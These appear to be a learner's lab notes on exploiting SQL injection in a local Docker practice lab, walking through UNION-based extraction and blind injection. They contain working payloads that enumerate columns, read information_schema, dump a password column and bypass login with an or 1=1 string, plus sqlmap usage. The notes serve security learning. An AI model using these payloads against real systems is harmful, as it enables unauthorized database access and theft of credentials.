---
description: >-
  Insight into post-enumeration of web vulnerabilities. Moving onto
  exploitaiton.
---

# Finding & Exploiting Common Web Vulnerabilities

## Prerequisites (Lab setup):

* On Kali, install docker.io and docker-compose modules.
* Go to the directory containing the unzipped labs and run this command:

```shellscript
root@kali:~# docker-compose up
```

-> To stop the containers, replace "up" with "stop"



* In the folder, run the ./set-permissions.sh command&#x20;
* Access the labs by going to "localhost" in the browser.
* Set up BurpSuite like this:&#x20;

1. Go to "Intercept" within "Proxy" in Burp
2. Open the browser and you will be able to capture traffic.

* If you need to reset the lab for any reason, go to "localhost/init.php"

***

## SQLi with Union:

* This lets us access information from other tables and columns that were not initially defined.
* The website presents the combined results of both SQL queries joined together with "UNION" to help us display internal database information. This is done by making a fake row using the values we provide through the second SELECT command. In the visible column, we can use this to tell SQL to return information we want in the fabricated row, like version() and SQL will just do it.&#x20;
* When we UNION select, we can only select the same number of columns (attributes) as in the original query).
* Example (for lab 0x01):



1.

```sql
jeremy' UNION SELECT null,null,null#

-- We tried first 1 null, then 2 nulls and then it worked with 3 nulls to figure out how many columns the original query had.
-- The # sign just comments the rest of the SQL query out so it is ignored.

-- The original vulnerable query might look something like this (what we are injecting into):

SELECT id, username, password FROM users WHERE username = 'jeremy';

-- This query returns 3 columns so we tested and found 3 nulls returning info successfully (one for each column).
```

-> Here, we use "jeremy'" because the original SQL query also starts off the string literal for you with an implicit "'" so you just have to close the string literal with a "'" at the end of jeremy, which prevents the rest of the SQL injection from being included in the string.

-> We trial and error the number of nulls in our SQL injection because we don't know the SQL database schema. This means we have to probe it - this is enumeration.

-> Nulls are a valid data type to use to match the data type of attributed in the table so that's why it works to put them in our SQL injection.

-> Our injections end up inside the WHERE clause because the web app places our input there before the SQL query is sent to the database.



2. We need to find the "visible" column. During this attack, the database will return a full row with all columns from our injected SELECT SQL injection. The webpage, however, will usually display only one of these columns - this is the visible column whose output actually appears on the page. Do this by testing which column reveals output:

```sql
jeremy' UNION SELECT 'A',null,null#
-- If the page shows A, then column 1 is visible. Repeat like below.

jeremy' UNION SELECT null,'B',null#
-- If the page shows B then column 2 is visible etc.
```



3. From here, we have to place our payload in the visible column. Example (assuming column 3 is visible):

```sql
jeremy' union select null,null,version()#

jeremy' union select null, null, table_name from information_schema.tables#

jeremy' union select null, null, column_name from information_schema.columns#
```

-> Figures out the version number. Other payloads can be used in the visible column.&#x20;

-> These payloads may be standard for the SQL versions. If not, find equivalents.&#x20;



4. If you find a sensitive column, like "passwords", you can run an SQL injection like this:

```
jeremy' union select null,null,password from injection0x01#
```

-> We need that first SELECT query because without it, the page would have nothing to display for the second SELECT query in the UNION.



***

## SQLi Blind:

* Remember to have the scope for Burp to http://localhost only for HTTP traffic.
* This is essentially when an SQLi executes on the vulnerable webpage but it doesn't show results.&#x20;



1. Open browser intercept from Burp and go to Injection0x02 lab. From here, log in and analyse the traffic intercepted on Burp. We need to test for injections.
2. Send the information to the Burp repeater - lets us send and modify requests to see the different responses we get back.&#x20;
3. Try basic payloads like below:

```sql
jeremy' or 1=1# 
```

-> This is for the username.

-> Make sure to URL encode the input because the SQL characters otherwise would be treated differently to how we intend for it to be executed.&#x20;

-> Look for signs of successful logon. E.g., the 'Content-Length' of the webpage might be the same number as when you logged on the first time successfully, indicating you reached the successful logon page.



4. You can automate the process of payloads using SQL Map like this:

```shellscript
root@kali:~# cat request.txt
root@kali:~# sqlmap -r request.txt

```

-> request.txt holds the text in the "Request" section under "Repeater" in BurpSuite. This is because SQL Map needs a full, raw HTTP request to understand the request and details needed to find an SQL injection.&#x20;

-> The sqlmap command tests for finding SQL injections.



5. If it fails to find SQL injections, you have the option to search manually, downloading payloads for fuzzing or trying to look for other injection points.&#x20;
